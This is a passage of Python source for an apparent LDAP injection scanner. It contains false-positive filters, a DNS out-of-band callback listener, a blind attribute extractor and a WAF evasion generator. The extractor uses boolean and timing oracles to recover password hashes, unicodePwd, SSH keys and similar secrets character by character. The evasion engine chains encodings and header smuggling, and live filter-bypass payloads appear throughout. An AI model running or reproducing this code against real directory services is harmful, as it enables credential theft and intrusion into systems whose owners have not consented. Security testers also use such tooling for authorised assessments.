        inj_has_error = bool(LDAP_ERRORS_RE.search(inj_body))
        ctl_has_error = bool(LDAP_ERRORS_RE.search(control_body)) if control_body else False
        bl_has_error  = bool(LDAP_ERRORS_RE.search(baseline.body))

        if inj_has_error and not ctl_has_error and not bl_has_error:
            return (True,
                    f"L3(A): LDAP error in injection only — targeted error diff (Δbl={diff_bl:.1%})")

        # Track B: Structural diff — use volatility-calibrated threshold
        if diff_bl >= baseline.diff_threshold and diff_ctl >= (baseline.diff_threshold * 0.5):
            return (True,
                    f"L3(B): structural unique Δbl={diff_bl:.1%} "
                    f"Δctl={diff_ctl:.1%} thr={baseline.diff_threshold:.1%}")

        return (False,
                f"L3: not unique Δbl={diff_bl:.1%} Δctl={diff_ctl:.1%} "
                f"thr={baseline.diff_threshold:.1%} (volatility={baseline.volatility.value})")

    def _layer4_replay_stability(
        self, ep: Endpoint, param: str,
        payload: Payload, baseline: Baseline,
        replay_hits: int
    ) -> Tuple[bool, str]:
        """Replay stability from verifier step 3 (shared, no extra requests)."""
        if replay_hits >= 2:
            return True, f"L4: replay stable {replay_hits}/3"
        return False, f"L4: replay unstable {replay_hits}/3"

    def _layer5_score_gate(
        self, result: DetectionResult
    ) -> Tuple[bool, str]:
        """
        Higher score requirement for non-error, non-behavioral findings.

        V8 tuning:
        - strong LDAP-specific signals keep the gate open
        - multi-signal structural findings get a softer threshold
        - single weak structural diffs still need a higher score
        """
        det_names = [s.detector for s in result.signals]
        signal_count = len(det_names)
        has_strong = bool(
            {"ClassTransition", "LDAPError", "Behavioral", "OOBCallback"}
            & set(det_names)
        )

        if not has_strong:
            min_score = 4.5
            if signal_count >= 3:
                min_score = 3.5
            elif signal_count >= 2:
                min_score = 4.0

            if result.score < min_score:
                return (False,
                        f"L5: structural-only score {result.score:.1f} "
                        f"< {min_score:.1f} gate")

        return True, f"L5: score {result.score:.1f} OK"

    def _layer6_session_consistency(
        self, ep: Endpoint, baseline: Baseline
    ) -> Tuple[bool, str]:
        """
        Final check: Does the baseline still return the same profile?
        Protects against session-state changes (e.g., account lockouts) 
        masquerading as injections.
        """
        # Re-fetch baseline with safe data (v3.0 fix: stop injecting into 'none' param)
        data_base = build_safe_data(ep.params, randomize=False)
        resp = self._client.send_endpoint(ep, data_base, phase="verification")
        
        if resp is None:
            return True, "L6: no response (assumed consistent)"
        
        # Site dynamics check
        delta = sim_delta(baseline.body, resp.text or "")
        # Generous threshold for drift over time
        if delta > max(baseline.diff_threshold * 1.5, 0.1):
            return (False,
                    f"L6: baseline drift detected (Δ={delta:.1%}) — session state likely changed")
        return True, "L6: session consistent"

    def _layer7_honeypot_discriminator(
        self, ep: Endpoint, result: DetectionResult,
        baseline: Baseline, ldap_ports_open: bool
    ) -> Tuple[bool, str]:
        """
        Layer 7 honeypot discriminator (G3).
        If LDAP error fires but no TCP LDAP port confirmed open and error appears
        in baseline, this is likely a honeypot/decoy fabricating LDAP errors.
        """
        # Only run if LDAPError signal fired
        if "LDAPError" not in [s.detector for s in result.signals]:
            return True, "L7: no LDAP error to discriminate"
        
        # If LDAP port confirmed open, error is genuine (skip honeypot check)
        if ldap_ports_open:
            return True, "L7: LDAP port confirmed — error is genuine"
        
        # Check if LDAP error pattern already present in baseline (honeypot indicator)
        if LDAP_ERRORS_RE.search(baseline.body):
            return False, "L7: LDAP error pattern in baseline — honeypot decoy detected"
        
        return True, "L7: error is post-injection only — likely genuine"

    def validate(
        self,
        ep:           Endpoint,
        param:        str,
        payload:      Payload,
        baseline:     Baseline,
        result:       DetectionResult,
        inj_body:     str,
        replay_hits:  int,
        control_body: str = "",
        ldap_ports_open: bool = False,  # ← G3: From Phase 3 raw LDAP testing
    ) -> Tuple[bool, bool, List[str]]:
        """
        Run all 7 FP filter layers (L1-L6 original, L7 honeypot discriminator).
        Returns (passed, should_downgrade, reasons_list).
        """
        reasons: List[str] = []

        # V8 tuning: endpoint unreliability is advisory unless the current signal is weak.
        # This preserves real findings on noisy targets while still suppressing low-value noise.
        ep_key = ep.key
        with self._ep_fp_lock:
            ep_fp_count = self._ep_fp_counts.get(ep_key, 0)
        if ep_fp_count >= 3:
            if result.score < 3.5:
                verbose(f"  FP fast-skip: {ep_key} has {ep_fp_count} prior FP hits and low score {result.score:.1f} — endpoint flagged unreliable")
                return False, False, [f"EP_UNRELIABLE: {ep_fp_count} prior FP hits on this endpoint"]
            reasons.append(f"EP_UNRELIABLE: {ep_fp_count} prior FP hits on this endpoint")

        l1_ok, l1_r = self._layer1_benign_control(
            ep, param, payload, baseline)
        reasons.append(l1_r)
        if not l1_ok:
            self._record_fp(ep_key)
            return False, False, reasons

        l2_ok, l2_r = self._layer2_cross_param(
            ep, param, payload, baseline)
        reasons.append(l2_r)
        if not l2_ok:
            self._record_fp(ep_key)
            return False, False, reasons

        l3_ok, l3_r = self._layer3_structural_uniqueness(
            inj_body, baseline, control_body)
        reasons.append(l3_r)
        if not l3_ok:
            self._record_fp(ep_key)
            return False, False, reasons

        l4_ok, l4_r = self._layer4_replay_stability(
            ep, param, payload, baseline, replay_hits)
        reasons.append(l4_r)
        if not l4_ok:
            self._record_fp(ep_key)
            return False, False, reasons

        l5_ok, l5_r = self._layer5_score_gate(result)
        reasons.append(l5_r)
        if not l5_ok:
            self._record_fp(ep_key)
            return False, False, reasons

        # Layer 6: Session Consistency Check
        l6_ok, l6_r = self._layer6_session_consistency(ep, baseline)
        reasons.append(l6_r)

        # Layer 7: Honeypot Discriminator
        l7_ok, l7_r = self._layer7_honeypot_discriminator(
            ep, result, baseline, ldap_ports_open)
        reasons.append(l7_r)
        if not l7_ok:
            self._record_fp(ep_key)
            return False, False, reasons

        # L6 failure results in downgrade rather than outright rejection
        should_downgrade = not l6_ok
        return True, should_downgrade, reasons

    def _record_fp(self, ep_key: str) -> None:
        """Track FP count per endpoint."""
        with self._ep_fp_lock:
            self._ep_fp_counts[ep_key] = self._ep_fp_counts.get(ep_key, 0) + 1
        if self._ep_fp_counts[ep_key] == 3:
            warn(f"  FP filter: endpoint {ep_key} hit 3 FP threshold — flagging unreliable")

# ═══════════════════════════════════════════════════════════════════════════════
# §17  OOB LISTENER — DNS/HTTP callback detection
# ═══════════════════════════════════════════════════════════════════════════════

class OOBListener:
    """
    DNS OOB listener for LDAP referral and JNDI injection detection.
    Uses dnslib when available, falls back to raw UDP socket parsing.
    Sends NXDOMAIN replies to suppress retry storms.
    ENHANCEMENT #4: Per-payload unique OOB subdomains for callback correlation.
    """

    def __init__(self, collab_domain: str, scan_id: str, port: int = 53):
        self._domain   = collab_domain.lower().rstrip(".")
        self._scan_id  = scan_id
        self._port     = port
        self._received: List[Dict[str, str]] = []
        self._lock     = threading.Lock()
        self._running  = False
        self._sock:    Optional[socket.socket] = None
        self._bound_port = 0
        # ENHANCEMENT #4: Payload correlation map: subdomain -> (param_name, endpoint_url)
        self._payload_map: Dict[str, Tuple[str, str]] = {}

    def start(self) -> int:
        """Start listener. Returns bound port (0 if failed)."""
        for try_port in (self._port, 5353, 15353, 25353):
            try:
                self._sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                self._sock.setsockopt(
                    socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self._sock.bind(("0.0.0.0", try_port))
                self._sock.settimeout(1.0)
                self._running    = True
                self._bound_port = try_port
                threading.Thread(
                    target=self._serve, daemon=True).start()
                info(f"  OOB listener: UDP port {try_port} "
                     f"({'dnslib' if _DNSLIB_OK else 'raw-UDP'}) "
                     f"domain={self._domain}")
                return try_port
            except OSError:
                continue
        warn("  OOB listener: could not bind — "
             "OOB detection disabled")
        return 0

    def stop(self) -> None:
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass

    def register_payload(self, param_name: str, endpoint_url: str) -> str:
        """
        ENHANCEMENT #4: Generate unique OOB subdomain for a payload.
        Returns the generated subdomain for use in injection payloads.
        Format: {scan_id[:6]}.{param_hash[:6]}.{collab_domain}
        """
        param_hash = hashlib.md5(param_name.encode()).hexdigest()[:6]
        subdomain = f"{self._scan_id[:6]}.{param_hash}"
        
        with self._lock:
            self._payload_map[subdomain] = (param_name, endpoint_url)
        
        return f"{subdomain}.{self._domain}"

    def get_payload_info(self, subdomain: str) -> Optional[Tuple[str, str]]:
        """ENHANCEMENT #4: Look up originating parameter and endpoint from subdomain."""
        with self._lock:
            return self._payload_map.get(subdomain)

    def _parse_qname_raw(self, data: bytes) -> str:
        """Minimal DNS qname parser (fallback when dnslib absent)."""
        try:
            offset = 12
            labels: List[str] = []
            while offset < len(data):
                ln = data[offset]
                if ln == 0:
                    break
                labels.append(
                    data[offset+1:offset+1+ln].decode(
                        "ascii", errors="replace"))
                offset += 1 + ln
            return ".".join(labels).lower()
        except Exception:
            return ""

    def _handle_dnslib(self, data: bytes,
                        addr: Tuple) -> None:
        """Handle DNS query with dnslib — send NXDOMAIN reply."""
        try:
            request = dnslib.DNSRecord.parse(data)
            qname   = str(request.q.qname).lower().rstrip(".")
            qtype   = str(dnslib.QTYPE.get(
                request.q.qtype, "UNKNOWN"))
            if self._domain in qname:
                # ENHANCEMENT #4: Extract subdomain and correlate to payload
                subdomain = qname.replace(f".{self._domain}", "")
                payload_info = self.get_payload_info(subdomain)
                
                callback_record = {
                    "src_ip":    addr[0],
                    "qname":     qname,
                    "qtype":     qtype,
                    "timestamp": now_iso(),
                }
                
                if payload_info:
                    param_name, endpoint_url = payload_info
                    callback_record["param"] = param_name
                    callback_record["endpoint"] = endpoint_url
                    success(f"  OOB callback: {addr[0]} → {qname!r} "
                           f"[CORRELATED: {endpoint_url}:{param_name}]")
                else:
                    success(f"  OOB callback: {addr[0]} → {qname!r} [{qtype}]")
                
                with self._lock:
                    self._received.append(callback_record)
            # Send NXDOMAIN
            reply = request.reply()
            reply.header.rcode = dnslib.RCODE.NXDOMAIN
            if self._sock:
                self._sock.sendto(reply.pack(), addr)
        except Exception:
            pass

    def _serve(self) -> None:
        while self._running and self._sock:
            try:
                data, addr = self._sock.recvfrom(512)
                if len(data) < 13:
                    continue
                if _DNSLIB_OK:
                    self._handle_dnslib(data, addr)
                else:
                    qname = self._parse_qname_raw(data)
                    if self._domain in qname:
                        # ENHANCEMENT #4: Correlate raw UDP callbacks to payloads
                        subdomain = qname.replace(f".{self._domain}", "")
                        payload_info = self.get_payload_info(subdomain)
                        
                        callback_record = {
                            "src_ip":    addr[0],
                            "qname":     qname,
                            "qtype":     "UNKNOWN",
                            "timestamp": now_iso(),
                        }
                        
                        if payload_info:
                            param_name, endpoint_url = payload_info
                            callback_record["param"] = param_name
                            callback_record["endpoint"] = endpoint_url
                            success(f"  OOB callback (raw): {addr[0]} → {qname!r} "
                                   f"[CORRELATED: {endpoint_url}:{param_name}]")
                        else:
                            success(f"  OOB callback (raw): {addr[0]} → {qname!r}")
                        
                        with self._lock:
                            self._received.append(callback_record)
            except socket.timeout:
                continue
            except Exception:
                pass

    def triggered(self) -> bool:
        with self._lock:
            return len(self._received) > 0

    @property
    def callbacks(self) -> List[Dict[str, str]]:
        with self._lock:
            return list(self._received)

# ═══════════════════════════════════════════════════════════════════════════════
# §18  PHASE 4 — INJECTION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

# Wave 4: Common headers for LDAP injection probing (§7.6)
LDAP_HEADERS = [
    "User-Agent", "Referer", "X-Forwarded-For", "X-Client-IP",
    "X-Remote-Addr", "X-LDAP-Filter", "X-UID", "X-Username",
    "X-Account-Name", "X-Profile", "X-Originating-IP",
]


class BlindAttributeExtractor:
    """
    V6 Enhanced: Multi-strategy blind attribute extractor.

    Strategy 1 — Boolean Binary Search (primary):
      Correct two-phase binary search: find the range first, then verify exact char.
      O(log2(N) * len) requests — ~190 requests for 32 chars over 72-char alphabet.

    Strategy 2 — Timing Side-Channel (fallback):
      When boolean oracle is suppressed/normalised, fall back to timing-based
      extraction using LDAP filter complexity to induce measurable delays.
      Filter (&(attr>=X)) causes the server to scan all entries beginning at X —
      larger matching sets produce longer scan times.

    Strategy 3 — Multi-attribute Enumeration:
      After schema discovery, systematically extract high-value attributes:
      passwords, tokens, ssh keys, email, group memberships, home directories.
    """

    # High-value target attributes by server type
    _ATTR_PRIORITY = {
        "ad":      ["sAMAccountName", "userPassword", "unicodePwd", "userPrincipalName",
                    "mail", "memberOf", "servicePrincipalName", "msDS-AllowedToActOnBehalfOfOtherIdentity",
                    "scriptPath", "homeDirectory", "description"],
        "openldap":["uid", "userPassword", "cn", "mail", "sshPublicKey",
                    "shadowPassword", "loginShell", "homeDirectory",
                    "gidNumber", "uidNumber", "description"],
        "generic": ["uid", "cn", "userPassword", "mail", "description",
                    "memberOf", "homeDirectory", "loginShell"],
    }

    def __init__(self, client: HTTPClient, pipeline: DetectionPipeline,
                 budget: AdaptiveBudgetManager, cfg: ScanConfig):
        self._client   = client
        self._pipeline = pipeline
        self._budget   = budget
        self._cfg      = cfg
        # Full printable alphabet sorted — correct ordering for binary search
        self._alphabet = (
            " !#$%&'()*+,-./"
            "0123456789:;<=>?@"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "[\\]^_`"
            "abcdefghijklmnopqrstuvwxyz"
            "{|}~"
        )
        self._timing_baseline_ms: Optional[float] = None

    # ── Oracle Confirmation ───────────────────────────────────────────────────

    def confirm_oracle(self, ep: Endpoint, param: str, baseline: Baseline) -> bool:
        """
        Confirm boolean oracle is deterministic before extraction.
        Runs 2×TRUE and 2×FALSE probes — requires stable separation.
        """
        TRUE_PROBES  = ["*(|(objectClass=*))", "*(cn=*)"]
        # V7 FIX: Use valid LDAP syntax that will never match real entries.
        # Previously used predictable strings that caused "no such user" errors
        # on AD, which were misclassified as "fired" by the error detector.
        # Null-byte prefix and hex-escaped nonexistent values are syntactically
        # valid but will produce empty results (not error responses).
        FALSE_PROBES = [
            "*(objectClass=\\00ZZZNEVER)",   # null-prefix — syntactically valid, no match
            "*(cn=\\00\\ff\\fe\\00NEVER)",   # hex-escaped garbage — valid filter, no entries
        ]

        true_fired = 0
        for raw in TRUE_PROBES:
            pl  = Payload(raw=raw, desc="oracle-true", technique="bool_true", tier=PayloadTier.TIER2_BOOLEAN)
            res = self._send_and_score(ep, param, pl, baseline)
            if res.fired:
                true_fired += 1

        false_fired = 0
        for raw in FALSE_PROBES:
            pl  = Payload(raw=raw, desc="oracle-false", technique="bool_false", tier=PayloadTier.TIER2_BOOLEAN)
            res = self._send_and_score(ep, param, pl, baseline)
            if res.fired:
                false_fired += 1

        oracle_ok = true_fired >= 1 and false_fired == 0
        if not oracle_ok:
            # Attempt to calibrate timing-based oracle as fallback
            oracle_ok = self._calibrate_timing_oracle(ep, param, baseline)
        return oracle_ok

    def _calibrate_timing_oracle(self, ep: Endpoint, param: str, baseline: Baseline) -> bool:
        """
        V7 FIX: Calibrate timing-based oracle with IQR-based jitter estimation.
        Uses 7 samples (was 3) for more reliable delta measurement.
        Aborts if jitter > 50% of the measured delta (oracle too noisy to use).
        """
        complex_pl = Payload(
            raw="*(|(objectClass=*)(cn=*)(uid=*)(mail=*)(sAMAccountName=*))",
            desc="timing-complex", technique="bool_true", tier=PayloadTier.TIER2_BOOLEAN)
        simple_pl = Payload(
            raw="*(objectClass=\\00ZZZNEVER)", desc="timing-simple",
            technique="bool_false", tier=PayloadTier.TIER2_BOOLEAN)

        N_SAMPLES = 7  # V7: increased from 3 for statistical reliability
        complex_times: List[float] = []
        simple_times:  List[float] = []

        for _ in range(N_SAMPLES):
            if not self._budget.acquire_for_phase("verification"):
                break
            data = build_injection_data(ep, param, complex_pl.raw, self._cfg.deterministic_suffix)
            resp = self._client.send_endpoint(ep, data, phase="verification")
            if resp:
                complex_times.append(resp.elapsed.total_seconds())

        for _ in range(N_SAMPLES):
            if not self._budget.acquire_for_phase("verification"):
                break
            data = build_injection_data(ep, param, simple_pl.raw, self._cfg.deterministic_suffix)
            resp = self._client.send_endpoint(ep, data, phase="verification")
            if resp:
                simple_times.append(resp.elapsed.total_seconds())

        if len(complex_times) < 4 or len(simple_times) < 4:
            return False

        def iqr_median(samples: List[float]) -> Tuple[float, float]:
            """Return (median, IQR) for a sample list."""
            s = sorted(samples)
            n = len(s)
            q1, q3 = s[n // 4], s[3 * n // 4]
            return statistics.median(s), q3 - q1

        med_complex, iqr_complex = iqr_median(complex_times)
        med_simple,  iqr_simple  = iqr_median(simple_times)

        # V7: Use IQR-based jitter (more robust than stddev on CDN/cached targets)
        jitter = max(iqr_complex, iqr_simple, 0.05) * 2
        delta  = med_complex - med_simple

        # V7: Abort if jitter > 50% of delta — oracle is too noisy
        if delta <= 0 or jitter > (delta * 0.5):
            verbose(f"    Timing oracle rejected: delta={delta*1000:.1f}ms jitter={jitter*1000:.1f}ms "
                    f"(jitter/delta={jitter/max(delta,0.001):.0%} > 50%)")
            return False

        if delta >= jitter:
            self._timing_baseline_ms = med_simple * 1000
            verbose(f"    Timing oracle calibrated: delta={delta*1000:.1f}ms jitter={jitter*1000:.1f}ms "
                    f"(jitter/delta={jitter/delta:.0%})")
            return True
        return False

    # ── Primary: Boolean Binary Search Extraction ─────────────────────────────

    def extract_all(self, ep: Endpoint, param: str, baseline: Baseline,
                    schema_attrs: List[str]) -> Dict[str, str]:
        """Extract values for all high-priority attributes using available oracle."""
        if self._cfg.no_extract:
            return {}

        server_type = getattr(self._cfg, "server_type", "generic")
        priority_attrs = self._ATTR_PRIORITY.get(server_type, self._ATTR_PRIORITY["generic"])
        target_attrs = schema_attrs if schema_attrs else priority_attrs

        # Merge: prioritised attrs first, then schema-discovered extras
        seen: Set[str] = set()
        ordered: List[str] = []
        for a in priority_attrs + target_attrs:
            if a not in seen:
                seen.add(a)
                ordered.append(a)

        results: Dict[str, str] = {}
        total_chars = 0
        char_cap = self._cfg.extract_limit

        for attr in ordered:
            if total_chars >= char_cap:
                break
            # First check attribute EXISTENCE to avoid wasting budget
            if not self._attr_exists(ep, param, attr, baseline):
                verbose(f"      [{attr}] not present — skipping")
                continue
            if not self._budget.acquire_for_phase("verification"):
                break

            val = self.extract_attribute(ep, param, attr, baseline)
            if val:
                results[attr] = val
                total_chars += len(val)
                success(f"    Blind Extracted [{attr}]: {val!r}")

        return results

    def _attr_exists(self, ep: Endpoint, param: str, attr: str, baseline: Baseline) -> bool:
        """
        Quick existence probe: does any entry have this attribute set?
        V7 FIX: Return False on budget exhaustion (was True — caused all remaining
        attributes to be attempted even when oracle was unreliable, burning budget).
        """
        if not self._budget.acquire_for_phase("verification"):
            return False   # V7 FIX: was True — budget exhaustion should stop extraction
        pl = Payload(raw=f"*({attr}=*)", desc=f"exist-{attr}",
                     technique="bool_enum", tier=PayloadTier.TIER2_BOOLEAN)
        res = self._send_and_score(ep, param, pl, baseline)
        return res.fired

    def extract_attribute(self, ep: Endpoint, param: str, attribute: str,
                          baseline: Baseline) -> str:
        """
        Extract full value of an attribute via binary search.
        Falls back to timing oracle if boolean oracle becomes unreliable.
        """
        # Determine oracle type (boolean preferred, timing fallback)
        use_timing = (self._timing_baseline_ms is not None)

        extracted = ""
        for pos in range(1, self._cfg.extract_limit + 1):
            if use_timing:
                char = self._find_char_timing(ep, param, attribute, pos, extracted, baseline)
            else:
                char = self._find_char_boolean(ep, param, attribute, pos, extracted, baseline)
            if not char:
                break
            extracted += char
            verbose(f"      [{attribute}] pos={pos} char={char!r} val_so_far={extracted!r}")

        return extracted

    def _find_char_boolean(self, ep: Endpoint, param: str, attribute: str,
                           pos: int, prefix: str, baseline: Baseline) -> str:
        """
        Correct two-phase boolean binary search:
          Phase 1 — Bisect to find LOWER BOUND of matching range.
          Phase 2 — Verify exact character by testing prefix+candidate exactly.
        """
        alpha = self._alphabet
        n = len(alpha)

        # Phase 1: Find leftmost index where alpha[idx] >= actual character
        lo, hi = 0, n
        while lo < hi:
            if not self._budget.acquire_for_phase("verification"):
                return ""
            mid = (lo + hi) // 2
            # Filter: (attribute >= prefix + alpha[mid])
            # TRUE if actual char >= alpha[mid]
            pl_raw = f"*({attribute}>={prefix}{alpha[mid]})"
            pl = Payload(raw=pl_raw, desc=f"bisect-ge-{mid}",
                         technique="bool_true", tier=PayloadTier.TIER2_BOOLEAN)
            res = self._send_and_score(ep, param, pl, baseline)
            if res.fired:
                lo = mid + 1
            else:
                hi = mid

        # lo-1 is the candidate index
        if lo == 0:
            return ""
        candidate = alpha[lo - 1]

        # Phase 2: Verify the exact character
        if not self._budget.acquire_for_phase("verification"):
            return candidate  # Return best guess if budget exhausted

        pl_exact = Payload(
            raw=f"*({attribute}={prefix}{candidate}*)",
            desc=f"exact-verify", technique="bool_true",
            tier=PayloadTier.TIER2_BOOLEAN)
        verify = self._send_and_score(ep, param, pl_exact, baseline)
        if verify.fired:
            return candidate

        # Phase 2 miss — scan ±3 neighbours for robustness
        for delta in [-1, 1, -2, 2, -3, 3]:
            idx = (lo - 1) + delta
            if 0 <= idx < n:
                if not self._budget.acquire_for_phase("verification"):
                    break
                nb_raw = f"*({attribute}={prefix}{alpha[idx]}*)"
                nb_pl  = Payload(raw=nb_raw, desc="neighbour",
                                 technique="bool_true", tier=PayloadTier.TIER2_BOOLEAN)
                nb_res = self._send_and_score(ep, param, nb_pl, baseline)
                if nb_res.fired:
                    return alpha[idx]

        return ""

    def _find_char_timing(self, ep: Endpoint, param: str, attribute: str,
                          pos: int, prefix: str, baseline: Baseline) -> str:
        """
        Timing-based character enumeration using LDAP filter scan complexity.
        Uses (&(attr>=X)) — filters that start earlier in the alphabet cause
        the server to scan more entries, producing a measurable timing difference.
        Bisects alphabet to find the transition point.
        """
        alpha = self._alphabet
        n = len(alpha)
        threshold_ms = self._timing_baseline_ms or 100.0
        jitter_ms = max(baseline.stddev * 1000, 30.0)

        lo, hi = 0, n - 1
        while lo < hi:
            if not self._budget.acquire_for_phase("verification"):
                break
            mid = (lo + hi) // 2
            pl_raw = f"*(&({attribute}>={prefix}{alpha[mid]})({attribute}<={prefix}{alpha[mid+1 if mid+1<n else mid]}))"
            pl = Payload(raw=pl_raw, desc=f"timing-range-{mid}",
                         technique="bool_true", tier=PayloadTier.TIER2_BOOLEAN)
            data = build_injection_data(ep, param, pl.raw, self._cfg.deterministic_suffix)
            resp = self._client.send_endpoint(ep, data, phase="verification")
            if resp is None:
                break
            elapsed_ms = resp.elapsed.total_seconds() * 1000
            if elapsed_ms > threshold_ms + jitter_ms:
                hi = mid
            else:
                lo = mid + 1

        if lo < n:
            return alpha[lo]
        return ""

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _send_and_score(self, ep: Endpoint, param: str, pl: Payload,
                        baseline: Baseline) -> DetectionResult:
        data = build_injection_data(ep, param, pl.raw, self._cfg.deterministic_suffix)
        resp = self._client.send_endpoint(ep, data, phase="verification")
        if resp is None:
            return DetectionResult(fired=False, score=0.0, signals=[],
                                   severity=Severity.INFO, evidence="")
        return self._pipeline.run(resp, baseline, pl)


# ═══════════════════════════════════════════════════════════════════════════════
# §V6-A  TIMING SIDE-CHANNEL EXTRACTOR
# ═══════════════════════════════════════════════════════════════════════════════

class PolymorphicBypassGenerator:
    """
    V6 Enhancement #4 — Dynamic WAF evasion engine.

    Moves beyond static T3 encoding by:
    • Building mutation chains (composition of N encoders).
    • Fragment smuggling — splitting payloads across parameters or headers.
    • Case mutation + whitespace insertion + Unicode substitution.
    • Request-level smuggling hints (chunked Transfer-Encoding, parameter pollution).

    All mutations are WAF-survival-filtered against self._client._survived_chars
    before being emitted. The generator keeps state so it learns which
    mutations succeed and prioritises them for subsequent params.
    """

    # Encoding primitives — stateless, composable
    _PRIMITIVES: List[Tuple[str, Any]] = [
        # name, fn
        ("url1",     lambda s: quote(s, safe="")),
        ("url2",     lambda s: quote(quote(s, safe=""), safe="")),
        ("hex_lc",   lambda s: "".join(f"\\{ord(c):02x}" for c in s)),
        ("hex_uc",   lambda s: "".join(f"\\{ord(c):02X}" for c in s)),
        ("utf16",    lambda s: s.encode("utf-16-le").hex()),
        ("html_ent", lambda s: "".join(f"&#{ord(c)};" for c in s)),
        ("null_mid", lambda s: s[:len(s)//2] + "\x00" + s[len(s)//2:] if s else s),
        ("null_sfx", lambda s: s + "%00"),
        ("ws_ins",   lambda s: re.sub(r'(\()', r'\1 ', s)),  # insert space inside parens
        ("case_mix", lambda s: "".join(
            c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s)
        )),
        ("attr_abbr",lambda s: re.sub(r'\bobjectClass\b', 'objectclass', s, flags=re.I)),
        ("paren_pad",lambda s: s.replace("(", "((").replace(")", "))")),
        ("cmt_ins",  lambda s: s.replace(")(", ")(/* */")),
    ]

    def __init__(self, client: "HTTPClient", cfg: "ScanConfig") -> None:
        self._client  = client
        self._cfg     = cfg
        # EMA success scores for primitives, keyed by primitive name
        self._prim_ema: Dict[str, float] = {n: 0.5 for n, _ in self._PRIMITIVES}
        self._lock = threading.Lock()

    # ── Scoring ───────────────────────────────────────────────────────────────

    def mark_success(self, prim_name: str) -> None:
        with self._lock:
            prev = self._prim_ema.get(prim_name, 0.5)
            self._prim_ema[prim_name] = 0.85 * prev + 0.15

    def mark_failure(self, prim_name: str) -> None:
        with self._lock:
            prev = self._prim_ema.get(prim_name, 0.5)
            self._prim_ema[prim_name] = 0.85 * prev

    def _sorted_primitives(self) -> List[Tuple[str, Any]]:
        with self._lock:
            scores = dict(self._prim_ema)
        return sorted(self._PRIMITIVES, key=lambda x: -scores.get(x[0], 0.5))

    # ── Core generation ───────────────────────────────────────────────────────

    def _payload_ok(self, raw: str) -> bool:
        survived = self._client._survived_chars
        return all(c not in raw or c in survived for c in "*()|&\\")

    def generate(
        self,
        base_payload: "Payload",
        depth:        int = 2,
        max_variants: int = 8,
    ) -> List["Payload"]:
        """
        Apply mutation chains up to `depth` deep.
        Returns up to max_variants unique Payload objects.
        """
        seen:     Set[str]      = {base_payload.raw}
        queue:    List[Tuple[str, List[str]]] = [(base_payload.raw, [])]
        variants: List["Payload"] = []

        for d in range(depth):
            next_queue: List[Tuple[str, List[str]]] = []
            for raw, chain in queue:
                for pname, pfn in self._sorted_primitives():
                    if len(variants) >= max_variants:
                        break
                    try:
                        mutated = pfn(raw)
                    except Exception:
                        continue
                    if mutated in seen or not mutated or mutated == raw:
                        continue
                    if not self._payload_ok(mutated):
                        continue
                    seen.add(mutated)
                    new_chain = chain + [pname]
                    chain_label = "→".join(new_chain)
                    variants.append(Payload(
                        raw        = mutated,
                        desc       = f"T3-POLY [{chain_label}]: {base_payload.desc}",
                        technique  = f"poly_{pname}",
                        tier       = PayloadTier.TIER3_WAF,
                        priority   = max(1, base_payload.priority - d),
                        encoded_already = True,
                    ))
                    next_queue.append((mutated, new_chain))
            queue = next_queue

        return variants[:max_variants]

    def generate_header_smuggle(
        self, base_payload: "Payload"
    ) -> List[Tuple[str, "Payload"]]:
        """
        Emit (header_name, Payload) pairs for header-based parameter smuggling.
        These are passed via send_header() to test proxy/WAF passthrough.
        """
        headers = [
            "X-Forwarded-For",
            "X-Real-IP",
            "X-Custom-IP-Authorization",
            "X-Originating-IP",
            "CF-Connecting-IP",
        ]
        results: List[Tuple[str, "Payload"]] = []
        for hname in headers:
            results.append((hname, Payload(
                raw       = base_payload.raw,
                desc      = f"T3-HDR-SMUG [{hname}]: {base_payload.desc}",
                technique = "header_smuggle",
                tier      = PayloadTier.TIER3_WAF,
                priority  = base_payload.priority,
            )))
        return results[:3]


# ═══════════════════════════════════════════════════════════════════════════════
# §V6-D  TARGET-AWARE PAYLOAD ADAPTOR
# ═══════════════════════════════════════════════════════════════════════════════

class TargetAwarePayloadAdaptor:
    """
    V6 Enhancement #5 — Context-sensitive payload crafting.

    After schema discovery (Phase 0 raw LDAP + web hints), builds payloads
    that are tailored to the target directory:

    • Uses discovered attribute names instead of generic 'uid'/'cn'.
    • Builds OR-chains referencing real group names hinted from HTML.
    • Constructs DN-specific payloads from the actual base DN.
    • Adjusts filter depth based on server type (AD vs OpenLDAP).

    Inputs
    ------
    schema_attrs  — list of attribute names discovered via RootDSE / web hints
    server_type   — from Phase 0 fingerprinting
    base_dn       — if known from RootDSE
    group_hints   — strings in HTML that look like group/role names
    """

    # Attributes worth injecting into for each server type
    _AD_ATTRS      = ["sAMAccountName","userPrincipalName","mail","displayName",
                      "memberOf","distinguishedName","objectSid","pwdLastSet"]
    _OPENLDAP_ATTRS= ["uid","cn","mail","sn","givenName","dn","uidNumber","gidNumber",
                      "homeDirectory","loginShell","userPassword","shadowPassword"]
    _GENERIC_ATTRS = ["uid","cn","mail","sn","displayName","description","member"]

    def __init__(
        self,
        schema_attrs: List[str],
        server_type:  str,
        base_dn:      str = "",
        group_hints:  Optional[List[str]] = None,
    ) -> None:
        self._schema  = schema_attrs or []
        self._stype   = server_type
        self._base_dn = base_dn
        self._groups  = group_hints or []
        self._built   = False
        self._payloads: List["Payload"] = []

    def _relevant_attrs(self) -> List[str]:
        """Merge schema-discovered attrs with type-specific defaults."""
        if self._stype == "ad":
            defaults = self._AD_ATTRS
        elif self._stype in ("openldap", "389ds"):
            defaults = self._OPENLDAP_ATTRS
        else:
            defaults = self._GENERIC_ATTRS
        # Discovered schema first, then fallbacks (deduplicated)
        combined = list(dict.fromkeys(self._schema + defaults))
        return combined[:20]

    def build(self) -> List["Payload"]:
        """
        Build a context-specific Tier-1 payload set.
        Called once and cached.
        """
        if self._built:
            return self._payloads

        attrs  = self._relevant_attrs()
        result: List["Payload"] = []

        # 1. Wildcard bypass for each real attribute
        for attr in attrs[:8]:
            result.append(Payload(
                raw       = f"*(|({attr}=*))",
                desc      = f"CTX: {attr} wildcard bypass",
                technique = "attr_bypass",
                tier      = PayloadTier.TIER1_CORE,
                priority  = 8,
            ))

        # 2. OR-chain across discovered attributes (more likely to match)
